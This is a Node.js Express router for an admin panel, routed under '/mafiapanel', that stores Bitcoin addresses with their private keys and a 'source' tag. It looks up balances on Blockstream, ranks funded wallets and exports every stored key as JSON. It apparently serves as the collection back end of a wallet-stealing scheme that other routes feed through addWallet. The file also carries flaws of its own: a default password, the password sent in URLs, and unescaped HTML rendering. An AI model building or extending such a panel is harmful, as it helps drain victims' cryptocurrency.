const express = require('express');
const fs = require('fs');
const path = require('path');
const axios = require('axios');
const router = express.Router();

// Admin configuration
const ADMIN_PASSWORD = process.env.ADMIN_PASSWORD || 'changeme123';
const BLOCKSTREAM_API = process.env.BITCOIN_NETWORK === 'mainnet' 
  ? 'https://blockstream.info/api' 
  : 'https://blockstream.info/testnet/api';

// File to store wallet data
const WALLETS_FILE = path.join(__dirname, '..', 'data', 'wallets.json');

// Ensure data directory exists
const dataDir = path.join(__dirname, '..', 'data');
if (!fs.existsSync(dataDir)) {
  fs.mkdirSync(dataDir, { recursive: true });
}

// Load wallets from file
function loadWallets() {
  try {
    if (fs.existsSync(WALLETS_FILE)) {
      const data = fs.readFileSync(WALLETS_FILE, 'utf8');
      return JSON.parse(data);
    }
  } catch (error) {
    console.error('Error loading wallets:', error);
  }
  return {};
}

// Save wallets to file
function saveWallets(wallets) {
  try {
    fs.writeFileSync(WALLETS_FILE, JSON.stringify(wallets, null, 2));
  } catch (error) {
    console.error('Error saving wallets:', error);
  }
}

// Add or update wallet in storage
function addWallet(address, privateKey, source = 'unknown') {
  const wallets = loadWallets();
  wallets[address] = {
    address,
    privateKey,
    source,
    firstSeen: wallets[address] ? wallets[address].firstSeen : new Date().toISOString(),
    lastUpdated: new Date().toISOString()
  };
  saveWallets(wallets);
}

// Get wallet balance from blockchain
async function getWalletBalance(address) {
  try {
    const response = await axios.get(`${BLOCKSTREAM_API}/address/${address}`);
    const balanceSats = response.data.chain_stats.funded_txo_sum - response.data.chain_stats.spent_txo_sum;
    const balanceBTC = (balanceSats / 100000000).toFixed(8);
    return { balanceSats, balanceBTC, success: true };
  } catch (error) {
    console.error(`Failed to fetch balance for ${address}:`, error.message);
    return { balanceSats: 0, balanceBTC: '0.00000000', success: false, error: error.message };
  }
}

// Middleware to check admin password
function requireAdminAuth(req, res, next) {
  const providedPassword = req.query.password || req.body.password;
  
  if (providedPassword !== ADMIN_PASSWORD) {
    return res.status(401).json({ error: 'Invalid admin password' });
  }
  
  next();
}

// Admin panel main page
router.get('/', (req, res) => {
  const htmlContent = `
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Admin Panel - Wallet Manager</title>
    <style>
        * {
            box-sizing: border-box;
            margin: 0;
            padding: 0;
        }
        
        body {
            font-family: 'Courier New', monospace;
            background: #000;
            color: #00ff00;
            min-height: 100vh;
            padding: 20px;
        }
        
        .container {
            max-width: 1200px;
            margin: 0 auto;
        }
        
        .header {
            text-align: center;
            margin-bottom: 30px;
            padding: 20px;
            border: 2px solid #00ff00;
            background: rgba(0, 255, 0, 0.1);
        }
        
        .header h1 {
            font-size: 2rem;
            margin-bottom: 10px;
            text-shadow: 0 0 10px #00ff00;
        }
        
        .auth-form {
            background: rgba(0, 255, 0, 0.1);
            border: 2px solid #00ff00;
            padding: 20px;
            margin-bottom: 20px;
            text-align: center;
        }
        
        .auth-form input {
            background: #000;
            color: #00ff00;
            border: 1px solid #00ff00;
            padding: 10px;
            margin: 0 10px;
            font-family: inherit;
        }
        
        .auth-form button {
            background: #00ff00;
            color: #000;
            border: none;
            padding: 10px 20px;
            cursor: pointer;
            font-family: inherit;
            font-weight: bold;
        }
        
        .auth-form button:hover {
            background: #00cc00;
        }
        
        .wallets-container {
            display: none;
        }
        
        .stats {
            display: grid;
            grid-template-columns: repeat(auto-fit, minmax(200px, 1fr));
            gap: 20px;
            margin-bottom: 30px;
        }
        
        .stat-card {
            background: rgba(0, 255, 0, 0.1);
            border: 2px solid #00ff00;
            padding: 20px;
            text-align: center;
        }
        
        .stat-card h3 {
            margin-bottom: 10px;
            color: #00ff00;
        }
        
        .stat-value {
            font-size: 1.5rem;
            font-weight: bold;
            text-shadow: 0 0 5px #00ff00;
        }
        
        .controls {
            margin-bottom: 20px;
            text-align: center;
        }
        
        .controls button {
            background: #00ff00;
            color: #000;
            border: none;
            padding: 10px 20px;
            margin: 0 10px;
            cursor: pointer;
            font-family: inherit;
            font-weight: bold;
        }
        
        .controls button:hover {
            background: #00cc00;
        }
        
        .wallets-table {
            background: rgba(0, 255, 0, 0.1);
            border: 2px solid #00ff00;
            width: 100%;
            border-collapse: collapse;
        }
        
        .wallets-table th,
        .wallets-table td {
            border: 1px solid #00ff00;
            padding: 10px;
            text-align: left;
            word-break: break-all;
        }
        
        .wallets-table th {
            background: rgba(0, 255, 0, 0.2);
            font-weight: bold;
        }
        
        .wallets-table tr:nth-child(even) {
            background: rgba(0, 255, 0, 0.05);
        }
        
        .address-cell {
            font-size: 0.8rem;
            max-width: 200px;
        }
        
        .balance-positive {
            color: #00ff00;
            font-weight: bold;
            text-shadow: 0 0 5px #00ff00;
        }
        
        .balance-zero {
            color: #666;
        }
        
        .loading {
            text-align: center;
            padding: 20px;
            color: #00ff00;
        }
        
        .error {
            color: #ff0000;
            text-align: center;
            padding: 10px;
            border: 1px solid #ff0000;
            background: rgba(255, 0, 0, 0.1);
            margin: 10px 0;
        }
    </style>
</head>
<body>
    <div class="container">
        <div class="header">
            <h1>🏴‍☠️ ADMIN PANEL - WALLET MANAGER 🏴‍☠️</h1>
            <p>Secure Bitcoin Wallet Tracking System</p>
        </div>
        
        <div id="authForm" class="auth-form">
            <h3>🔐 Admin Authentication Required</h3>
            <input type="password" id="passwordInput" placeholder="Enter admin password" />
            <button onclick="authenticate()">ACCESS PANEL</button>
        </div>
        
        <div id="walletsContainer" class="wallets-container">
            <div class="stats" id="statsContainer">
                <div class="stat-card">
                    <h3>Total Wallets</h3>
                    <div class="stat-value" id="totalWallets">0</div>
                </div>
                <div class="stat-card">
                    <h3>Total Balance</h3>
                    <div class="stat-value" id="totalBalance">0.00000000 BTC</div>
                </div>
                <div class="stat-card">
                    <h3>Active Wallets</h3>
                    <div class="stat-value" id="activeWallets">0</div>
                </div>
                <div class="stat-card">
                    <h3>Last Updated</h3>
                    <div class="stat-value" id="lastUpdated">-</div>
                </div>
            </div>
            
            <div class="controls">
                <button onclick="refreshBalances()">🔄 REFRESH BALANCES</button>
                <button onclick="exportData()">💾 EXPORT DATA</button>
                <button onclick="loadWallets()">📋 RELOAD WALLETS</button>
            </div>
            
            <div id="loadingIndicator" class="loading" style="display: none;">
                🔄 Loading wallet balances...
            </div>
            
            <div id="errorContainer"></div>
            
            <table class="wallets-table" id="walletsTable">
                <thead>
                    <tr>
                        <th>Address</th>
                        <th>Balance (BTC)</th>
                        <th>Balance (Sats)</th>
                        <th>Source</th>
                        <th>First Seen</th>
                        <th>Last Updated</th>
                        <th>Actions</th>
                    </tr>
                </thead>
                <tbody id="walletsTableBody">
                </tbody>
            </table>
        </div>
    </div>

    <script>
        let currentPassword = '';
        
        function authenticate() {
            const password = document.getElementById('passwordInput').value;
            if (!password) {
                alert('Please enter admin password');
                return;
            }
            
            currentPassword = password;
            
            fetch('/mafiapanel/auth', {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({ password: password })
            })
            .then(response => response.json())
            .then(data => {
                if (data.success) {
                    document.getElementById('authForm').style.display = 'none';
                    document.getElementById('walletsContainer').style.display = 'block';
                    loadWallets();
                } else {
                    alert('Invalid password');
                }
            })
            .catch(error => {
                alert('Authentication failed: ' + error.message);
            });
        }
        
        function loadWallets() {
            document.getElementById('loadingIndicator').style.display = 'block';
            document.getElementById('errorContainer').innerHTML = '';
            
            fetch(\`/mafiapanel/wallets?password=\${currentPassword}\`)
            .then(response => response.json())
            .then(data => {
                document.getElementById('loadingIndicator').style.display = 'none';
                
                if (data.error) {
                    showError(data.error);
                    return;
                }
                
                displayWallets(data.wallets);
                updateStats(data.stats);
            })
            .catch(error => {
                document.getElementById('loadingIndicator').style.display = 'none';
                showError('Failed to load wallets: ' + error.message);
            });
        }
        
        function refreshBalances() {
            document.getElementById('loadingIndicator').style.display = 'block';
            document.getElementById('errorContainer').innerHTML = '';
            
            fetch(\`/mafiapanel/refresh?password=\${currentPassword}\`, { method: 'POST' })
            .then(response => response.json())
            .then(data => {
                document.getElementById('loadingIndicator').style.display = 'none';
                
                if (data.error) {
                    showError(data.error);
                    return;
                }
                
                displayWallets(data.wallets);
                updateStats(data.stats);
                alert('Balances refreshed successfully!');
            })
            .catch(error => {
                document.getElementById('loadingIndicator').style.display = 'none';
                showError('Failed to refresh balances: ' + error.message);
            });
        }
        
        function displayWallets(wallets) {
            const tbody = document.getElementById('walletsTableBody');
            tbody.innerHTML = '';
            
            Object.values(wallets).forEach(wallet => {
                const row = document.createElement('tr');
                const balanceClass = wallet.balanceSats > 0 ? 'balance-positive' : 'balance-zero';
                
                row.innerHTML = \`
                    <td class="address-cell">\${wallet.address}</td>
                    <td class="\${balanceClass}">\${wallet.balanceBTC || '0.00000000'}</td>
                    <td class="\${balanceClass}">\${wallet.balanceSats || '0'}</td>
                    <td>\${wallet.source}</td>
                    <td>\${new Date(wallet.firstSeen).toLocaleString()}</td>
                    <td>\${new Date(wallet.lastUpdated).toLocaleString()}</td>
                    <td>
                        <button onclick="copyAddress('\${wallet.address}')" style="background: #00ff00; color: #000; border: none; padding: 5px; cursor: pointer; font-size: 0.8rem;">📋</button>
                    </td>
                \`;
                
                tbody.appendChild(row);
            });
        }
        
        function updateStats(stats) {
            document.getElementById('totalWallets').textContent = stats.totalWallets;
            document.getElementById('totalBalance').textContent = stats.totalBalance + ' BTC';
            document.getElementById('activeWallets').textContent = stats.activeWallets;
            document.getElementById('lastUpdated').textContent = new Date().toLocaleString();
        }
        
        function copyAddress(address) {
            navigator.clipboard.writeText(address).then(() => {
                alert('Address copied to clipboard!');
            });
        }
        
        function exportData() {
            window.open(\`/mafiapanel/export?password=\${currentPassword}\`);
        }
        
        function showError(message) {
            const errorContainer = document.getElementById('errorContainer');
            errorContainer.innerHTML = \`<div class="error">\${message}</div>\`;
        }
        
        // Allow Enter key to submit password
        document.getElementById('passwordInput').addEventListener('keypress', function(e) {
            if (e.key === 'Enter') {
                authenticate();
            }
        });
    </script>
</body>
</html>
  `;
  
  res.send(htmlContent);
});

// Authentication endpoint
router.post('/auth', requireAdminAuth, (req, res) => {
  res.json({ success: true, message: 'Authentication successful' });
});

// Get all wallets with balances
router.get('/wallets', requireAdminAuth, async (req, res) => {
  try {
    const wallets = loadWallets();
    const walletsWithBalances = {};
    let totalBalanceSats = 0;
    let activeWallets = 0;
    
    // Get current balances for all wallets
    for (const [address, wallet] of Object.entries(wallets)) {
      const balance = await getWalletBalance(address);
      walletsWithBalances[address] = {
        ...wallet,
        ...balance
      };
      
      if (balance.success) {
        totalBalanceSats += balance.balanceSats;
        if (balance.balanceSats > 0) {
          activeWallets++;
        }
      }
    }
    
    const totalBalanceBTC = (totalBalanceSats / 100000000).toFixed(8);
    
    res.json({
      wallets: walletsWithBalances,
      stats: {
        totalWallets: Object.keys(wallets).length,
        totalBalance: totalBalanceBTC,
        activeWallets: activeWallets
      }
    });
  } catch (error) {
    res.status(500).json({ error: 'Failed to load wallets', details: error.message });
  }
});

// Refresh all wallet balances
router.post('/refresh', requireAdminAuth, async (req, res) => {
  try {
    const wallets = loadWallets();
    const walletsWithBalances = {};
    let totalBalanceSats = 0;
    let activeWallets = 0;
    
    // Get current balances for all wallets
    for (const [address, wallet] of Object.entries(wallets)) {
      const balance = await getWalletBalance(address);
      walletsWithBalances[address] = {
        ...wallet,
        ...balance,
        lastUpdated: new Date().toISOString()
      };
      
      if (balance.success) {
        totalBalanceSats += balance.balanceSats;
        if (balance.balanceSats > 0) {
          activeWallets++;
        }
      }
    }
    
    // Update the stored wallet data with new balances
    saveWallets(walletsWithBalances);
    
    const totalBalanceBTC = (totalBalanceSats / 100000000).toFixed(8);
    
    res.json({
      wallets: walletsWithBalances,
      stats: {
        totalWallets: Object.keys(wallets).length,
        totalBalance: totalBalanceBTC,
        activeWallets: activeWallets
      }
    });
  } catch (error) {
    res.status(500).json({ error: 'Failed to refresh balances', details: error.message });
  }
});

// Export wallet data as JSON
router.get('/export', requireAdminAuth, (req, res) => {
  try {
    const wallets = loadWallets();
    const timestamp = new Date().toISOString().replace(/[:.]/g, '-');
    const filename = `wallets-backup-${timestamp}.json`;
    
    res.setHeader('Content-Type', 'application/json');
    res.setHeader('Content-Disposition', `attachment; filename="${filename}"`);
    res.json({
      exportedAt: new Date().toISOString(),
      totalWallets: Object.keys(wallets).length,
      wallets: wallets
    });
  } catch (error) {
    res.status(500).json({ error: 'Failed to export data', details: error.message });
  }
});

// Export the addWallet function for use by other routes
module.exports = router;
module.exports.addWallet = addWallet;